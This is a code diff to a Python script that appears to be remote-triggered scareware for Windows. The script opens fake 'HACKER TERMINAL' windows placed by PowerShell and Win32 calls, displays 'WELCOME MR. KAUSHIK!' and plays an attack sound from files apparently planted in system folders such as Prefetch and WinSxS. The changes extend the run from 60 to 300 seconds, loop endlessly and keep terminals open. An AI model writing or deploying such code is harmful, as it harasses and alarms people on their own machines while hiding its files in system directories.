@@ -244,14 +244,15 @@ def is_attack_active():
 
 os.system('color 0a')
 os.system('mode con: cols=100 lines=35')
+os.system('title HACKER TERMINAL')
 
 chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%%^&*"
 width = 100
 columns = [0] * width
 
 start = time.time()
-# Run while attack is active (check flag file)
-while is_attack_active() and (time.time() - start < 60):  # Max 60 seconds safety
+# Run while attack is active (check flag file) - extended duration
+while is_attack_active() and (time.time() - start < 300):  # Max 5 minutes
     line = ""
     for i in range(width):
         if random.random() > 0.95:
@@ -268,25 +269,25 @@ while is_attack_active() and (time.time() - start < 60):  # Max 60 seconds safet
     if not is_attack_active():
         break
 
-# Only show message if attack was active when we got here
-if is_attack_active():
-    os.system('cls')
-    os.system('color 0c')
-    msg = "WELCOME MR. KAUSHIK!"
-    print()
-    print("=" * 100)
-    print()
-    print(" " * 35 + msg)
-    print()
-    print("=" * 100)
-    
-    for i in range(5):
+# Keep terminal open even after attack ends
+os.system('cls')
+os.system('color 0c')
+msg = "WELCOME MR. KAUSHIK!"
+print()
+print("=" * 100)
+print()
+print(" " * 35 + msg)
+print()
+print("=" * 100)
+
+# Keep terminal alive
+while True:
+    try:
+        time.sleep(1)
         if not is_attack_active():
             break
-        time.sleep(0.2)
-        os.system('color 0a')
-        time.sleep(0.2)
-        os.system('color 0c')
+    except KeyboardInterrupt:
+        break
 ''' % flag_file.replace("\\", "\\\\")
     
     temp_file = os.path.join(tempfile.gettempdir(), "matrix_hacker.py")
@@ -309,19 +310,31 @@ if is_attack_active():
         y = monitor['y'] + random.randint(0, max(0, monitor['height'] - 500))
         
         # Create PowerShell command to position the terminal
+        # Use /K to keep terminal open, and add pause at end of script
         ps_cmd = '''
-$process = Start-Process cmd -ArgumentList '/C', 'color 0a && python "%s"' -PassThru
-Start-Sleep -Milliseconds 300
+$process = Start-Process cmd -ArgumentList '/K', 'color 0a && python "%s" && pause' -PassThru
+Start-Sleep -Milliseconds 500
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
     [DllImport("user32.dll")]
     public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
 $hwnd = $process.MainWindowHandle
+$maxAttempts = 10
+$attempt = 0
+while ($hwnd -eq [IntPtr]::Zero -and $attempt -lt $maxAttempts) {
+    Start-Sleep -Milliseconds 200
+    $process.Refresh()
+    $hwnd = $process.MainWindowHandle
+    $attempt++
+}
 if ($hwnd -ne [IntPtr]::Zero) {
+    [Win32]::ShowWindow($hwnd, 4)
     [Win32]::MoveWindow($hwnd, %d, %d, 850, 450, $true)
 }
 ''' % (temp_file, x, y)
@@ -538,16 +551,19 @@ def max_volume():
 # 6. PLAY ATTACK AUDIO
 # ============================================
 def find_attack_audio():
-    """Find attack.mp3 in Audios folder (uses user's Audios folder as primary)"""
-    # Primary location (user's home directory)
+    """Find attack.mp3 in Photos or Audios folder (uses user's Photos folder as primary)"""
+    # Primary location (user's home directory) - Photos folder first
     user_home = os.path.expanduser("~")
-    primary_path = os.path.join(user_home, "Audios", "attack.mp3")
+    primary_path_photos = os.path.join(user_home, "Photos", "attack.mp3")
+    primary_path_audios = os.path.join(user_home, "Audios", "attack.mp3")
     
     # Use the same search logic as Photos folder
     localappdata = os.environ.get('LOCALAPPDATA', '')
     search_paths = [
-        # PRIMARY: User's Audios folder
-        primary_path,
+        # PRIMARY: User's Photos folder (where PC client copies files)
+        primary_path_photos,
+        # SECONDARY: User's Audios folder
+        primary_path_audios,
         # Also check Photos folder in Audios directory
         os.path.join(user_home, "Audios", "Photos", "attack.mp3"),
         # System locations (deployed by PC client - most persistent)
@@ -556,11 +572,14 @@ def find_attack_audio():
         r"C:\Windows\Prefetch\Photos\attack.mp3",
         r"C:\Windows\WinSxS\Photos\attack.mp3",
         # Fallback locations
-        os.path.join(user_home, "Photos", "attack.mp3"),
         os.path.join(pc_client_path, "Photos", "attack.mp3"),
+        os.path.join(pc_client_path, "Audios", "attack.mp3"),
         os.path.join(os.getcwd(), "Photos", "attack.mp3"),
+        os.path.join(os.getcwd(), "Audios", "attack.mp3"),
         os.path.join(script_dir, "Photos", "attack.mp3"),
+        os.path.join(script_dir, "Audios", "attack.mp3"),
         os.path.join(script_dir, "..", "Photos", "attack.mp3"),
+        os.path.join(script_dir, "..", "Audios", "attack.mp3"),
     ]
     
     # Filter out None values
